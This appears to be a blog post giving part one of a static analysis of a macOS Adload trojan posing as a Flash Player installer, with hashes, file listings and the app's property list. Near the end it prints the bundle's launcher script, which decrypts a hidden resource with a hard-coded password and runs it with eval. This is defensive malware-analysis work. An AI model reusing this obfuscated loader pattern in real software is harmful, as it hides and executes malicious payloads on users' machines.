---
layout: post
title: Adload Sample, Part 1: Static Analysis
---
Happy New Year! Excuse my absense, while I have been away taking studying for GCFA and enjoying the holidays. Now that's all over I'm back to show you some static analysis of a macOS trojan I found today. Hope you enjoy and please send any questions, or comments to ragingroosterrem@gmail.com. Thanks!

### Tools Used:
- macOS High Sierra virtualized with Virtualbox
- Bash Commands: bash, cat, cd, clamscan, codesign, file, find, hdiutil, ls, md5, openssl, plutil, shasum
- VirusTotal

### The Story, YAFFD
I was googling a security tool called moloch + threat hunting and clicked on a link to what I thought was a security blog containing some juciy information. It was the third link, on the first page of results mind you! Instead of being served up some info to make my day better, I was redirected to Yet Another Fake Flash Downloader (YAFFD). Okay, I'd preffer to do some malware analysis anyway.

<img src="{{ site.baseurl }}/images/YAFFD.png">

### Analysis

#### After I clicked the pretty button and downloaded the .dmg, I fired up my bash shell and went to my downloads folder to see what gift I was given.
```
$ cd ~/Downloads

$ ls
AdobeFlashPlayerInstaller.dmg

$ file AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: zlib compressed data

$ md5 AdobeFlashPlayerInstaller.dmg 
MD5 (AdobeFlashPlayerInstaller.dmg) = 8c5a97b8234af7f41e03b4421904a8ff

$ shasum AdobeFlashPlayerInstaller.dmg 
b972667995d2ca1d205c3be4d57fc80814834970  AdobeFlashPlayerInstaller.dmg

$ codesign -dvvv AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: code object is not signed at all
```
_Hey! Wouldn't Adobe sign this?_

#### Let's tear into this .dmg like a candy bar.
```
$ hdiutil attach AdobeFlashPlayerInstaller.dmg 
Checksumming Protective Master Boot Record (MBR : 0)…
Protective Master Boot Record (MBR :: verified   CRC32 $7510EE46
Checksumming GPT Header (Primary GPT Header : 1)…
 GPT Header (Primary GPT Header : 1): verified   CRC32 $366ED316
Checksumming GPT Partition Data (Primary GPT Table : 2)…
GPT Partition Data (Primary GPT Tabl: verified   CRC32 $70831B84
Checksumming  (Apple_Free : 3)…
                    (Apple_Free : 3): verified   CRC32 $00000000
Checksumming disk image (Apple_HFS : 4)…
..............................................................................
          disk image (Apple_HFS : 4): verified   CRC32 $B3A8FFCC
Checksumming  (Apple_Free : 5)…
                    (Apple_Free : 5): verified   CRC32 $00000000
Checksumming GPT Partition Data (Backup GPT Table : 6)…
GPT Partition Data (Backup GPT Table: verified   CRC32 $70831B84
Checksumming GPT Header (Backup GPT Header : 7)…
  GPT Header (Backup GPT Header : 7): verified   CRC32 $00709B9F
verified   CRC32 $7647ACE4
/dev/disk1          	GUID_partition_scheme          	
/dev/disk1s1        	Apple_HFS                      	/Volumes/Player

$ cd /Volumes/Player/

$ find .
.
./.5692438210.png
./.DS_Store
./Player_210.app
./Player_210.app/Contents
./Player_210.app/Contents/_CodeSignature
./Player_210.app/Contents/_CodeSignature/CodeDirectory
./Player_210.app/Contents/_CodeSignature/CodeRequirements
./Player_210.app/Contents/_CodeSignature/CodeRequirements-1
./Player_210.app/Contents/_CodeSignature/CodeResources
./Player_210.app/Contents/_CodeSignature/CodeSignature
./Player_210.app/Contents/Info.plist
./Player_210.app/Contents/MacOS
./Player_210.app/Contents/MacOS/Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg
./Player_210.app/Contents/Resources
./Player_210.app/Contents/Resources/210
./Player_210.app/Contents/Resources/app5692438210.icns
./Player_210.app/Contents/Resources/enc
```
_Looks similar to most other .dmg directory structures._

##### Let's take a look at the .dmg's Property List (plist) which stores some valuable app data.
```
$ cd /Volumes/Player/Player_210.app/

$ plutil -p Info.plist 
{
  "CFBundleExecutable" => "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleIconFile" => "app5692438210.icns"
  "CFBundleIdentifier" => "com.Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleInfoDictionaryVersion" => "6.0"
  "CFBundleName" => "PlayerInstaller"
  "CFBundlePackageType" => "APPL"
  "CFBundleShortVersionString" => "1.0"
  "CFBundleSupportedPlatforms" => [
    0 => "MacOSX"
  ]
  "CFBundleVersion" => "5692438210"
  "LSMinimumSystemVersion" => "10.9"
  "NSHumanReadableCopyright" => "Copyright © 2017 All rights reserved."
  "NSPrincipalClass" => "NSApplication"
}
```
_Looks like "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg" is the binary executed by the .dmg._

##### Let's inspect the binary.
```
$ cd MacOS/

$ ls
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg

$ file Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg: Bourne-Again shell script text executable, ASCII text
```
_Hey! That's a shell script, not a Macho. But, that's not too extraordinary._ 

##### Let's see what it does.
```bash
$ cat Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
#!/bin/bash
cd "$(dirname "$BASH_SOURCE")"
fileDir="$(dirname "$(pwd -P)")"
eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:5692438210 <"$fileDir"/Resources/enc)"
```
